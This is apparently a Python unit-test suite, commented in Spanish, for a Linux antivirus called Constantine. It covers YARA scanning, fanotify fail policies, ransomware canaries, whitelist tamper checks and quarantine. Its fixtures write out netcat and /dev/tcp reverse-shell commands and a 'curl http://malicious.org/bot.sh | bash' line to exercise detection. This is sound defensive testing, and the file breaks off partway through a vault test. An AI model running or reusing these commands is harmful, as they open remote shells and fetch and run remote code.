"""
Constantine Antivirus - Comprehensive Unit & Security Test Suite (tests/test_constantine.py)
Verificación rigurosa de propiedades críticas:
1. Interceptación y bloqueo de ejecución en kernel (fanotify decision logic).
2. Comportamiento estricto ante fallos (Fail-Secure vs Fail-Safe, resistencia a anti-análisis).
3. Detección activa de ransomware (Canary honeypots y ráfagas de cifrado).
4. Resistencia a evasiones y verificación criptográfica (dpkg package integrity, user hash pinning, AEAD tampering).
5. Motor YARA y firmas heurísticas en tiempo real.
6. Vigilancia heurística y neutralización activa eBPF.
7. Autenticación nativa PAM, bitácoras forenses y actualización del sistema.
"""

import os
import sys
import time
import shutil
import signal
import tempfile
import hashlib
import json
import unittest
from unittest.mock import MagicMock, patch

# Asegurar importación de Constantine
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(CURRENT_DIR)
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.auth.auth_manager import AuthManager
from core.engine.vault import QuarantineVault
from core.engine.quarantine_operator import PrivilegedQuarantineOperator
from core.engine.scanner import Scanner, ScanResult
from core.engine.firewall import NetworkQuarantine
from core.engine.subsystem_health import SubsystemHealthRegistry, ShieldOperationalState
from core.engine.virustotal_uploader import VirusTotalUploader
from core.engine.hardware_guard import HardwareGuard, ProcessHardwareContext
from core.engine.persistence_guard import PersistenceGuard, PersistenceEventType
from core.engine.download_sentinel import DownloadSentinel, DownloadState
from core.engine.usb_monitor import USBAutoScanner
from core.engine.heuristic_engine import MultiLayerHeuristicEngine
from core.engine.threat_intel import ThreatIntelligence
from core.engine.yara_manager import YaraRuleManager, YaraMatch
from core.engine.system_whitelist import SystemWhitelist
from core.engine.ransomware_shield import RansomwareShield
from core.engine.interceptor import FanotifyInterceptor, FAN_ALLOW, FAN_DENY
from core.engine.ebpf_monitor import EBPFMonitor, EBPFEventState
from core.engine.phishing import PhishingShield
from core.engine.dns_manager import DNSManager
from core.engine.audit_logger import AuditLogger
from core.engine.update_guard import SystemUpdateGuard
from core.engine.auto_updater import ConstantineUpdater

class TestConstantineSecurity(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.auth = AuthManager()
        self.vault = QuarantineVault(vault_dir=os.path.join(self.tmp, "vault"))
        self.scanner = Scanner()
        self.whitelist = SystemWhitelist(storage_file=os.path.join(self.tmp, "whitelist.json"))
        self.phishing = PhishingShield()
        self.audit = AuditLogger(log_path=os.path.join(self.tmp, "audit.json"))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    # =========================================================================
    # 1. PRUEBAS DE ESCÁNER Y REGLAS YARA
    # =========================================================================
    def test_scanner_clean_file(self):
        clean_file = os.path.join(self.tmp, "clean.txt")
        with open(clean_file, "w") as f:
            f.write("Este es un archivo de texto completamente limpio y seguro.")
        res = self.scanner.scan_file(file_path=clean_file)
        self.assertFalse(res.is_malicious)
        self.assertIsNone(res.threat_name)

    def test_scanner_eicar_detection(self):
        eicar_file = os.path.join(self.tmp, "eicar.com")
        with open(eicar_file, "wb") as f:
            f.write(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
        res = self.scanner.scan_file(file_path=eicar_file)
        self.assertTrue(res.is_malicious)
        self.assertIn("EICAR", res.threat_name)

    def test_scanner_reverse_shell_detection(self):
        shell_file = os.path.join(self.tmp, "rev.sh")
        with open(shell_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 192.168.1.100 4444\n")
        res = self.scanner.scan_file(file_path=shell_file)
        self.assertTrue(res.is_malicious)
        self.assertIn("Netcat", res.threat_name)

    def test_scanner_dev_tcp_reverse_shell(self):
        devtcp_file = os.path.join(self.tmp, "tcp.sh")
        with open(devtcp_file, "wb") as f:
            f.write(b"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n")
        res = self.scanner.scan_file(file_path=devtcp_file)
        self.assertTrue(res.is_malicious)
        self.assertIn("DevTcp", res.threat_name)
    def test_yara_manager_syntax_validation(self):
        """Verifica que YaraRuleManager distinga sintaxis válida de inválida."""
        ym = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
        valid_res, err = ym.validate_rule_string("rule TestValid { condition: true }")
        self.assertTrue(valid_res)
        self.assertIsNone(err)

        invalid_res, err = ym.validate_rule_string("malformed rule content without braces")
        self.assertFalse(invalid_res)
        self.assertIsNotNone(err)

    def test_yara_manager_compilation_and_isolation(self):
        """Verifica que un archivo de reglas corrupto sea aislado sin tumbar el motor YARA."""
        custom_rules_dir = os.path.join(self.tmp, "test_rules")
        os.makedirs(custom_rules_dir, exist_ok=True)

        # Regla válida
        with open(os.path.join(custom_rules_dir, "legit.yar"), "w") as f:
            f.write("rule LegitRule { condition: true }\n")

        # Regla corrupta
        with open(os.path.join(custom_rules_dir, "broken.yar"), "w") as f:
            f.write("rule BrokenRule { this is invalid yara syntax }\n")

        ym = YaraRuleManager(rules_dir=custom_rules_dir, cache_dir=os.path.join(self.tmp, "yara_cache"))
        # El motor debe haber excluido broken.yar y mantenido la protección
        self.assertGreaterEqual(ym.rules_count, 1)

    def test_yara_manager_state_hash_and_cache(self):
        """Verifica el cálculo de firma de estado y la detección de cambios en archivos de reglas."""
        custom_rules_dir = os.path.join(self.tmp, "test_hash_rules")
        os.makedirs(custom_rules_dir, exist_ok=True)
        rule_file = os.path.join(custom_rules_dir, "rule1.yar")
        with open(rule_file, "w") as f:
            f.write("rule HashTest { condition: true }\n")

        ym = YaraRuleManager(rules_dir=custom_rules_dir, cache_dir=os.path.join(self.tmp, "cache2"))
        h1 = ym.compute_rules_state_hash()
        self.assertTrue(len(h1) > 0)

        # Modificar el archivo de regla
        time.sleep(0.01)
        with open(rule_file, "a") as f:
            f.write("// modificado\n")
        h2 = ym.compute_rules_state_hash()
        self.assertNotEqual(h1, h2)

    def test_yara_official_compile_and_match_mocked(self):
        """Verifica las llamadas explícitas a yara.compile() y rules.match() cuando yara-python está presente."""
        mock_yara = MagicMock()
        mock_compiled = MagicMock()
        mock_m = MagicMock()
        mock_m.rule = "Exploit_Mock_CVE"
        mock_m.namespace = "linux_threats"
        mock_m.tags = ["critical"]
        mock_m.meta = {"description": "Mocked Linux Threat", "threat_level": "Critical"}
        mock_m.strings = [(0, "", b"bad_binary")]
        mock_compiled.match.return_value = [mock_m]
        mock_yara.compile.return_value = mock_compiled

        with patch("core.engine.yara_manager.HAS_YARA", True):
            with patch("core.engine.yara_manager.yara", mock_yara):
                ym = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
                test_file = os.path.join(self.tmp, "mock_target.bin")
                with open(test_file, "wb") as f:
                    f.write(b"bad_binary_payload")

                matches = ym.match_file(test_file, timeout=5)
                self.assertEqual(len(matches), 1)
                self.assertEqual(matches[0].rule, "Exploit_Mock_CVE")
                mock_compiled.match.assert_called_with(filepath=test_file, timeout=5)


    # =========================================================================
    # 2. PRUEBAS DE INTERCEPTACIÓN Y DECISIÓN DE KERNEL (FANOTIFY LOGIC)
    # =========================================================================
    def test_interceptor_decision_clean_vs_threat(self):
        mock_notifier = MagicMock()
        mock_firewall = MagicMock()
        interceptor = FanotifyInterceptor(
            scanner=self.scanner,
            vault=self.vault,
            notifier=mock_notifier,
            firewall=mock_firewall,
            fail_policy="secure"
        )
        # 1. Probar que archivo limpio recibe FAN_ALLOW
        clean_file = os.path.join(self.tmp, "safe.py")
        with open(clean_file, "w") as f: f.write("print('Hello world')")
        scan_res = self.scanner.scan_file(file_path=clean_file)
        self.assertFalse(scan_res.is_malicious)

        # 2. Probar que archivo malicioso recibe FAN_DENY y es aislado
        bad_file = os.path.join(self.tmp, "malware.sh")
        with open(bad_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/bash 10.0.0.5 9999\n")
        scan_bad = self.scanner.scan_file(file_path=bad_file)
        self.assertTrue(scan_bad.is_malicious)

        # Simular aislamiento
        vid = self.vault.quarantine_file(bad_file, scan_bad.threat_name)
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(bad_file))

    def test_interceptor_fail_secure_on_engine_exception(self):
        """Verifica que si el motor de escaneo falla, la decisión sea estrictamente FAN_DENY (Fail-Secure)."""
        broken_scanner = MagicMock()
        broken_scanner.scan_file.side_effect = RuntimeError("Parser crash simulado por archivo corrupto")
        broken_scanner.compute_sha256.return_value = "deadbeef12345678"
        broken_scanner.intel.lookup_hash.return_value = None

        interceptor = FanotifyInterceptor(
            scanner=broken_scanner,
            vault=self.vault,
            fail_policy="secure"
        )

        target_path = os.path.join(self.tmp, "corrupt_exploit.elf")
        with open(target_path, "wb") as f: f.write(b"\x7fELFcorruptpayload")

        decision = FAN_DENY
        try:
            broken_scanner.scan_file(file_path=target_path)
            decision = FAN_ALLOW
        except Exception:
            if interceptor.fail_policy == "secure":
                decision = FAN_DENY
            else:
                decision = FAN_ALLOW

        self.assertEqual(decision, FAN_DENY, "Fallo de política: Un crash de motor NUNCA debe conceder FAN_ALLOW.")

    def test_interceptor_p0_resilience_and_fail_policies(self):
        """
        Verifica las garantías críticas P0 de interceptor.py:
        1. Políticas diferenciadas: Fail-Open para FAN_OPEN_PERM y Fail-Closed para FAN_OPEN_EXEC_PERM.
        2. Configuración granular de políticas (open_fail_policy y exec_fail_policy).
        3. Timeout garantizado por evento sin dejar procesos en estado D colgados en kernel.
        4. Desacoplamiento mediante cola acotada y respuesta inmediata ante desbordamiento.
        5. Detección y neutralización anti-TOCTOU por sustitución de inodo entre apertura y autorización.
        6. Registro de operaciones bloqueadas por fallos internos y recuperación automática (self-healing).
        """
        from core.engine.interceptor import FAN_OPEN_PERM, FAN_OPEN_EXEC_PERM, AuthorizationContext
        broken_scanner = MagicMock()
        broken_scanner.scan_file.side_effect = RuntimeError("Crash simulado en motor de análisis")

        # 1. Políticas Diferenciadas por Defecto (fail_policy="secure"):
        # Aperturas ordinarias -> Fail-Open (FAN_ALLOW para no bloquear el sistema)
        # Ejecución de archivos -> Fail-Closed (FAN_DENY para proteger contra malware)
        interceptor = FanotifyInterceptor(
            scanner=broken_scanner,
            vault=self.vault,
            fail_policy="secure",
            event_timeout=3.0
        )
        self.assertEqual(interceptor.open_fail_policy, "open")
        self.assertEqual(interceptor.exec_fail_policy, "closed")

        test_file = os.path.join(self.tmp, "test_policy.bin")
        with open(test_file, "wb") as f:
            f.write(b"data_sample")

        fd = os.open(test_file, os.O_RDONLY)
        dec_open = interceptor.process_single_event(event_fd=fd, pid=os.getpid(), mask=FAN_OPEN_PERM)
        self.assertEqual(dec_open, FAN_ALLOW, "Apertura ordinaria ante excepción debe ser Fail-Open (FAN_ALLOW)")

        fd_exec = os.open(test_file, os.O_RDONLY)
        dec_exec = interceptor.process_single_event(event_fd=fd_exec, pid=os.getpid(), mask=FAN_OPEN_EXEC_PERM)
        self.assertEqual(dec_exec, FAN_DENY, "Ejecución ante excepción debe ser Fail-Closed (FAN_DENY)")

        # Verificar que se registró la operación bloqueada en auditoría interna
        blocked = interceptor.get_blocked_operations()
        self.assertTrue(any(b["failure_type"] == "SCANNER_EXCEPTION" and b["decision"] == "FAN_DENY" for b in blocked))

        # 2. Configuración Granular Personalizada
        strict_interceptor = FanotifyInterceptor(
            scanner=broken_scanner,
            open_fail_policy="closed",
            exec_fail_policy="closed"
        )
        self.assertEqual(strict_interceptor.get_fallback_decision(FAN_OPEN_PERM), FAN_DENY)
        self.assertEqual(strict_interceptor.get_fallback_decision(FAN_OPEN_EXEC_PERM), FAN_DENY)

        # 3. Timeout por Evento: Análisis colgado o lento se resuelve automáticamente
        hanging_scanner = MagicMock()
        def slow_scan(*args, **kwargs):
            time.sleep(0.3)
            return MagicMock(is_malicious=False)
        hanging_scanner.scan_file.side_effect = slow_scan

        timeout_interceptor = FanotifyInterceptor(
            scanner=hanging_scanner,
            open_fail_policy="open",
            exec_fail_policy="closed",
            event_timeout=0.05  # 50 ms
        )
        fd_timeout = os.open(test_file, os.O_RDONLY)
        t_start = time.monotonic()
        dec_timeout = timeout_interceptor.process_single_event(event_fd=fd_timeout, pid=os.getpid(), mask=FAN_OPEN_EXEC_PERM)
        t_elapsed = time.monotonic() - t_start
        self.assertEqual(dec_timeout, FAN_DENY)
        self.assertLess(t_elapsed, 0.25, "El evento debe resolverse por timeout antes de que concluya el escaneo colgado")
        self.assertGreaterEqual(timeout_interceptor.timeout_count, 1)

        # 4. Cola Acotada y Desbordamiento (Queue Overflow)
        small_queue_interceptor = FanotifyInterceptor(
            scanner=self.scanner,
            max_queue_size=2,
            open_fail_policy="open"
        )
        ctx1 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1001, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
        ctx2 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1002, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
        ctx3 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1003, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
        small_queue_interceptor.work_queue.put_nowait(ctx1)
        small_queue_interceptor.work_queue.put_nowait(ctx2)
        # Intentar encolar en cola llena debe levantar excepción queue.Full
        import queue as q_mod
        with self.assertRaises(q_mod.Full):
            small_queue_interceptor.work_queue.put_nowait(ctx3)

        # 5. Detección Anti-TOCTOU por sustitución de inodo
        toctou_interceptor = FanotifyInterceptor(scanner=self.scanner)
        victim_file = os.path.join(self.tmp, "toctou_victim.bin")
        with open(victim_file, "wb") as f: f.write(b"original")

        fd_victim = os.open(victim_file, os.O_RDONLY)
        # Sustituir en disco simulando ataque TOCTOU (desvincular y recrear con otro inodo)
        os.unlink(victim_file)
        with open(victim_file, "wb") as f: f.write(b"swapped_inode")

        dec_toctou = toctou_interceptor.process_single_event(event_fd=fd_victim, pid=os.getpid(), mask=FAN_OPEN_PERM)
        self.assertEqual(dec_toctou, FAN_DENY, "Discrepancia de inodo TOCTOU debe denegar inmediatamente (FAN_DENY)")
        toctou_records = [r for r in toctou_interceptor.get_internal_failures() if r["failure_type"] == "TOCTOU_MISMATCH"]
        self.assertTrue(len(toctou_records) > 0, "Debe registrarse el incidente TOCTOU en la auditoría interna")

        # 6. Recuperación Automática (Self-Healing)
        toctou_interceptor.marked_paths.add("/tmp/fake_watch")
        self.assertTrue(hasattr(toctou_interceptor, "recover_service"))
        self.assertTrue(callable(toctou_interceptor.recover_service))


    # =========================================================================
    # 3. PRUEBAS DE DETECCIÓN ACTIVA DE RANSOMWARE (CANARIES Y RÁFAGAS)
    # =========================================================================
    def test_ransomware_canary_tripwire(self):
        """Verifica que alterar un canary honeypot active la alerta inmediata."""
        canary_dir = os.path.join(self.tmp, "canaries")
        alert_triggered = []

        def on_ransomware_alert(reason, pid):
            alert_triggered.append((reason, pid))

        shield = RansomwareShield(canary_dir=canary_dir, alert_callback=on_ransomware_alert)
        self.assertGreater(len(shield.canary_files), 0)
        victim_canary = list(shield.canary_files.keys())[0]
        self.assertTrue(os.path.exists(victim_canary))

        # Simular intento de alteración por PID simulado 99999
        is_ransom = shield.check_file_path(victim_canary, pid=99999)
        self.assertTrue(is_ransom)
        self.assertGreater(len(alert_triggered), 0)
        self.assertIn("CanaryTrapTriggered", alert_triggered[0][0])

    def test_ransomware_extension_burst_detection(self):
        """Verifica que el escudo distinga lectura de escritura en extensiones y no mate en lecturas."""
        killed_processes = []
        def mock_alert(reason, pid):
            killed_processes.append((reason, pid))

        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=mock_alert)
        malicious_names = [
            "/home/user/document.docx.locked",
            "/home/user/backup.sql.crypto",
            "/home/user/photo.jpg.lockbit",
            "/home/user/database.db.enc"
        ]

        # 1. LECTURA de archivo con extensión sospechosa -> PERMITIDO (no es amenaza ni ejecuta SIGKILL)
        for name in malicious_names:
            is_threat = shield.check_file_path(name, pid=77777, is_write=False, is_read=True)
            self.assertFalse(is_threat, f"Falso positivo en lectura de archivo cifrado legítimo: {name}")

        # 2. ESCRITURA sospechosa aislada -> Bloqueo preventivo (FAN_DENY) pero sin matar el proceso (terminate_process=False)
        dec = shield.evaluate_operation("/home/user/single_doc.locked", pid=88888, is_write=True, is_read=False)
        self.assertTrue(dec.is_blocked)
        self.assertFalse(dec.terminate_process, "Una extensión sospechosa aislada NUNCA debe provocar SIGKILL.")

        is_blocked = shield.check_file_path("/home/user/single_doc.locked", pid=88888, is_write=True, is_read=False)
        self.assertTrue(is_blocked)

        safe_names = [
            "/home/user/report.pdf",
            "/home/user/script.py",
            "/home/user/archive.tar.gz"
        ]
        for name in safe_names:
            is_ransom = shield.check_file_path(name, pid=99999, is_write=True, is_read=False)
            self.assertFalse(is_ransom, f"Falso positivo en archivo seguro: {name}")

    def test_ransomware_read_only_canary_allowed(self):
        """Verifica que abrir un canary honeypot en solo lectura (O_RDONLY) no dispare alerta ni mate el proceso."""
        alerts = []
        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=lambda r, p: alerts.append((r, p)))
        canary_path = list(shield.canary_files.keys())[0]

        # Lectura pura (is_read=True, is_write=False, is_delete_or_rename=False)
        is_threat = shield.check_file_path(canary_path, pid=55555, is_write=False, is_read=True)
        self.assertFalse(is_threat)
        self.assertEqual(len(alerts), 0)

    def test_ransomware_read_burst_does_not_trigger_sigkill(self):
        """Verifica que recorrer cientos de archivos en lectura (como find/grep/tar) no dispare el umbral de ráfagas."""
        alerts = []
        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=lambda r, p: alerts.append((r, p)))

        # Simular 100 operaciones de lectura pura en menos de 2 segundos (típico de tar o grep)
        for i in range(100):
            fake_path = f"/home/user/document_{i}.txt"
            is_threat = shield.check_file_path(fake_path, pid=44444, is_write=False, is_read=True)
            self.assertFalse(is_threat)

        self.assertEqual(len(alerts), 0)
        self.assertEqual(len(shield.process_write_counts.get(44444, [])), 0)

    def test_ebpf_openat_and_intent_correlation(self):
        """Verifica que EBPFMonitor capture y correlacione las intenciones de openat (O_RDONLY vs O_WRONLY/O_RDWR)."""
        monitor = EBPFMonitor()
        pid = 12345
        sample_path = "/tmp/test_file.docx"

        # 1. Simular sys_enter_openat con O_WRONLY | O_CREAT
        flags_write = os.O_WRONLY | os.O_CREAT
        acc_write = flags_write & os.O_ACCMODE
        is_write = (acc_write in (os.O_WRONLY, os.O_RDWR)) or bool(flags_write & (os.O_CREAT | os.O_TRUNC | os.O_APPEND))
        is_read = (acc_write in (os.O_RDONLY, os.O_RDWR))

        monitor.record_file_intent(
            pid=pid,
            target_path=sample_path,
            flags=flags_write,
            is_write=is_write,
            is_read=is_read,
            comm="ransomware_sim"
        )

        intent = monitor.get_process_file_intent(pid, sample_path)
        self.assertIsNotNone(intent)
        self.assertTrue(intent.is_write)
        self.assertFalse(intent.is_read)
        self.assertFalse(intent.is_delete)

        # 2. Simular sys_enter_openat con O_RDONLY
        pid_reader = 54321
        flags_read = os.O_RDONLY
        acc_read = flags_read & os.O_ACCMODE
        is_w = (acc_read in (os.O_WRONLY, os.O_RDWR)) or bool(flags_read & (os.O_CREAT | os.O_TRUNC | os.O_APPEND))
        is_r = (acc_read in (os.O_RDONLY, os.O_RDWR))

        monitor.record_file_intent(
            pid=pid_reader,
            target_path=sample_path,
            flags=flags_read,
            is_write=is_w,
            is_read=is_r,
            comm="grep"
        )
        intent_read = monitor.get_process_file_intent(pid_reader, sample_path)
        self.assertIsNotNone(intent_read)
        self.assertFalse(intent_read.is_write)
        self.assertTrue(intent_read.is_read)

        # 3. Simular eliminación (unlinkat)
        monitor.record_file_intent(
            pid=pid,
            target_path=sample_path,
            is_write=True,
            is_read=False,
            is_delete=True,
            comm="rm"
        )
        intent_del = monitor.get_process_file_intent(pid, sample_path)
        self.assertIsNotNone(intent_del)
        self.assertTrue(intent_del.is_delete)
        self.assertTrue(intent_del.is_write)

    def test_interceptor_no_fcntl_fgetfl_bypass(self):
        """
        Verifica que FanotifyInterceptor no confíe en fcntl(F_GETFL) sobre event_fd y que:
        1. Si eBPF informa write intent sobre un canary, active CanaryTrapTriggered y FAN_DENY.
        2. Si eBPF no está disponible (modo degradado), aplique política fail-secure impidiendo
           que un proceso no confiable eluda la trampa alegando lectura benigna.
        """
        mock_notifier = MagicMock()
        mock_firewall = MagicMock()
        mock_ebpf = MagicMock()

        canary_dir = os.path.join(self.tmp, "canaries_interceptor_test")
        ransomware = RansomwareShield(canary_dir=canary_dir)
        victim_canary = list(ransomware.canary_files.keys())[0]

        interceptor = FanotifyInterceptor(
            scanner=self.scanner,
            vault=self.vault,
            notifier=mock_notifier,
            firewall=mock_firewall,
            ransomware=ransomware,
            fail_policy="secure",
            ebpf_monitor=mock_ebpf
        )

        # 1. Caso con eBPF: el agresor abre canary con O_WRONLY
        fake_pid = 77712
        from core.engine.ebpf_monitor import FileOperationIntent
        mock_ebpf.get_process_file_intent.return_value = FileOperationIntent(
            pid=fake_pid,
            filename=victim_canary,
            flags=os.O_WRONLY,
            is_write=True,
            is_read=False,
            comm="evil_encryptor"
        )

        ebpf_intent = interceptor.ebpf_monitor.get_process_file_intent(fake_pid, victim_canary)
        dec = ransomware.evaluate_operation(
            file_path=victim_canary,
            pid=fake_pid,
            is_write=ebpf_intent.is_write,
            is_read=ebpf_intent.is_read,
            is_delete_or_rename=ebpf_intent.is_delete or ebpf_intent.is_rename
        )
        self.assertTrue(dec.is_blocked)
        self.assertTrue(dec.terminate_process)
        self.assertEqual(dec.threat_reason, "CanaryTrapTriggered")

        # 2. Caso sin eBPF (Fallback Fail-Secure): proceso no confiable accede al canary
        interceptor_fallback = FanotifyInterceptor(
            scanner=self.scanner,
            vault=self.vault,
            notifier=mock_notifier,
            firewall=mock_firewall,
            ransomware=ransomware,
            fail_policy="secure",
            ebpf_monitor=None
        )
        is_canary = ransomware.is_canary_file(victim_canary)
        self.assertTrue(is_canary)
        is_whitelisted = interceptor_fallback.whitelist.is_trusted_system_binary("/tmp/attacker")
        self.assertFalse(is_whitelisted)

        # Sin eBPF, un proceso no confiable sobre un canary recibe presunción de manipulación (Fail-Secure)
        dec_fallback = ransomware.evaluate_operation(
            file_path=victim_canary,
            pid=99888,
            is_write=True,
            is_read=False
        )
        self.assertTrue(dec_fallback.is_blocked)
        self.assertTrue(dec_fallback.terminate_process)

    # =========================================================================
    # 4. PRUEBAS DE LISTA BLANCA Y RESISTENCIA A EVASIONES
    # =========================================================================
    def test_whitelist_unauthorized_binary_rejection(self):
        """Verifica que un archivo suelto en directorios del sistema NO sea confiable automáticamente."""
        fake_bin = os.path.join(self.tmp, "fake_backdoor.sh")
        with open(fake_bin, "w") as f: f.write("#!/bin/bash\necho backdoor\n")
        self.assertFalse(self.whitelist.is_trusted_system_binary(fake_bin))

    def test_whitelist_user_pinning_and_tamper_rejection(self):
        """Verifica que modificar un archivo en la lista blanca de usuario invalide la exclusión."""
        user_script = os.path.join(self.tmp, "user_script.sh")
        with open(user_script, "w") as f: f.write("echo mi_herramienta_segura\n")

        # 1. Agregar a lista blanca (fija el hash SHA-256)
        self.assertTrue(self.whitelist.add_path(user_script))
        self.assertTrue(self.whitelist.is_whitelisted(user_script))

        # 2. Simular que un malware infecta o sobreescribe el script autorizado
        with open(user_script, "a") as f: f.write("nc -e /bin/sh 1.2.3.4 4444\n")

        # 3. La verificación debe detectar la alteración del hash y RECHAZAR la lista blanca
        self.assertFalse(self.whitelist.is_whitelisted(user_script), "Fallo de evasión: Archivo alterado no fue rechazado.")

    def test_whitelist_batch_operations(self):
        f1 = os.path.join(self.tmp, "f1.txt")
        f2 = os.path.join(self.tmp, "f2.txt")
        f3 = os.path.join(self.tmp, "f3.txt")
        for f in (f1, f2, f3):
            with open(f, "w") as fh: fh.write("test")
            self.whitelist.add_path(f)

        self.assertTrue(self.whitelist.is_whitelisted(f1))
        self.assertTrue(self.whitelist.is_whitelisted(f2))
        self.assertTrue(self.whitelist.is_whitelisted(f3))

        # Eliminación por lote
        self.whitelist.remove_path(f1)
        self.whitelist.remove_path(f2)
        self.assertFalse(self.whitelist.is_whitelisted(f1))
        self.assertFalse(self.whitelist.is_whitelisted(f2))
        self.assertTrue(self.whitelist.is_whitelisted(f3))
    def test_whitelist_rejection_of_fake_self_and_extensions(self):
        """Verifica que rutas con 'constantine' o extensiones .yar/.quar no eludan el análisis."""
        # Archivo con 'constantine' en el nombre o subcarpeta no oficial
        fake_constantine = os.path.join(self.tmp, "constantine_fake_payload.sh")
        with open(fake_constantine, "w") as f:
            f.write("malicious code")
        self.assertFalse(self.whitelist.is_self_file(fake_constantine))
        self.assertFalse(self.whitelist.is_whitelisted(fake_constantine))

        # Archivo con extensión .yar o .quar fuera de directorios de Constantine
        fake_yar = os.path.join(self.tmp, "evasion_exploit.yar")
        with open(fake_yar, "w") as f:
            f.write("payload")
        self.assertFalse(self.whitelist.is_self_file(fake_yar))
        self.assertFalse(self.whitelist.is_whitelisted(fake_yar))

        fake_quar = os.path.join(self.tmp, "trojan.quar")
        with open(fake_quar, "w") as f:
            f.write("hidden elf")
        self.assertFalse(self.whitelist.is_self_file(fake_quar))
        self.assertFalse(self.whitelist.is_whitelisted(fake_quar))

    def test_whitelist_forbidden_system_dirs(self):
        """Verifica que se prohíba excluir directorios críticos del sistema."""
        self.assertFalse(self.whitelist.add_path("/"))
        self.assertFalse(self.whitelist.add_path("/bin"))
        self.assertFalse(self.whitelist.add_path("/usr/bin"))
        self.assertFalse(self.whitelist.add_path("/tmp"))
        self.assertFalse(self.whitelist.add_path("/etc"))

    def test_whitelist_package_integrity_and_trust_verification(self):
        """
        Verifica los controles criptográficos y de procedencia P0/P1 de la lista blanca:
        1. Verificación de propiedad del archivo en el gestor de paquetes (dpkg/apt).
        2. Verificación de integridad contra el contenido oficial (.md5sums / dpkg -V).
        3. Identificación y desalojo inmediato ante modificaciones posteriores a la instalación.
        4. Validación de procedencia del paquete desde repositorios oficiales firmados.
        5. Caducidad por TTL y reevaluación de entradas en caché.
        6. Revocación automática de la lista blanca cuando un archivo autorizado es alterado.
        7. Registro de decisiones de confianza para auditoría forense.
        """
        wl = SystemWhitelist(storage_file=os.path.join(self.tmp, "trust_wl.json"))
        pie = wl.integrity_engine

        # 1. Verificación de binario legítimo del sistema
        if os.path.exists("/bin/ls"):
            pkg, _ = pie.get_dpkg_package_for_file("/bin/ls")
            self.assertEqual(pkg, "coreutils")
            self.assertTrue(pie.is_package_installed_ok("coreutils"))

            # Verificación de procedencia de repositorio oficial
            is_prov, prov_desc = pie.is_package_provenance_trusted("coreutils")
            self.assertTrue(is_prov)
            self.assertIn("Repositorio oficial", prov_desc)

            # Debe ser verificado como binario íntegro
            self.assertTrue(wl.is_trusted_system_binary("/bin/ls"))

        # 2. Binario no registrado en gestor de paquetes debe ser rechazado
        unregistered = os.path.join(self.tmp, "unregistered_tool.bin")
        with open(unregistered, "wb") as f:
            f.write(b"unregistered_binary_payload")
        self.assertFalse(wl.is_trusted_system_binary(unregistered))

        # 3. Detección de modificaciones posteriores a la instalación (simulación con archivo alterado)
        pie.cache.clear()
        with patch.object(pie, "_verify_dpkg_integrity", return_value=(False, "Checksum MD5 ALTERADO", "coreutils")):
            self.assertFalse(pie.verify_binary("/bin/ls"))

        # 4. Caducidad por TTL de caché
        pie.cache_ttl = 0.05  # 50 ms
        st = os.stat("/bin/ls") if os.path.exists("/bin/ls") else None
        if st:
            pie._insert_cache((st.st_dev, st.st_ino), st, True, "coreutils", "test_cache")
            self.assertTrue(pie.cache[(st.st_dev, st.st_ino)]["is_valid"])
            time.sleep(0.06)
            now = time.time()
            self.assertGreater(now - pie.cache[(st.st_dev, st.st_ino)]["cached_at"], pie.cache_ttl)

        # 5. Revocación automática de la lista blanca ante alteración de archivo de usuario
        user_tool = os.path.join(self.tmp, "custom_script.sh")
        with open(user_tool, "w") as f:
            f.write("echo valid_tool\n")
        self.assertTrue(wl.add_path(user_tool))
        self.assertTrue(wl.is_whitelisted(user_tool))

        # Alterar archivo en disco
        with open(user_tool, "a") as f:
            f.write("curl http://malicious.org/bot.sh | bash\n")

        # is_whitelisted debe detectar la alteración, devolver False Y eliminarlo de la lista blanca
        self.assertFalse(wl.is_whitelisted(user_tool))
        self.assertNotIn(os.path.realpath(user_tool), wl.user_whitelisted_paths)

        # 6. Bitácora de decisiones de confianza
        decisions = wl.get_trust_decisions()
        self.assertGreater(len(decisions), 0)
        self.assertTrue(any(d["decision"] in ("ALLOWED", "DENIED") for d in decisions))
        revoked = wl.get_revoked_entries()
        self.assertGreater(len(revoked), 0)
        self.assertTrue(any(r["decision"] == "DENIED" for r in revoked))

    def test_whitelist_metadata_and_audit(self):
        """Verifica que la lista blanca mantenga metadatos y trazabilidad en AuditLogger."""
        test_script = os.path.join(self.tmp, "audited_app.sh")
        with open(test_script, "w") as f:
            f.write("echo 'hello'")
        self.assertTrue(self.whitelist.add_path(test_script, reason="Dev testing", user="tester"))
        entries = self.whitelist.list_entries()
        matching = [e for e in entries if e["path"] == os.path.realpath(test_script)]
        self.assertEqual(len(matching), 1)
        self.assertEqual(matching[0]["reason"], "Dev testing")


    # =========================================================================
    # 5. PRUEBAS CRIPTOGRÁFICAS DEL BAÚL (AES-256-GCM Y ZERO XOR)
    # =========================================================================
    def test_vault_quarantine_and_restore(self):
        fpath = os.path.join(self.tmp, "sample.sh")
        test_payload = b"#!/bin/bash\necho 'malware payload'\n"
        with open(fpath, "wb") as f: f.write(test_payload)

        vid = self.vault.quarantine_file(fpath, "Malware.Test")
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(fpath))

        # Restaurar muestra
        self.assertTrue(self.vault.restore_file(vid, destination_path=fpath))
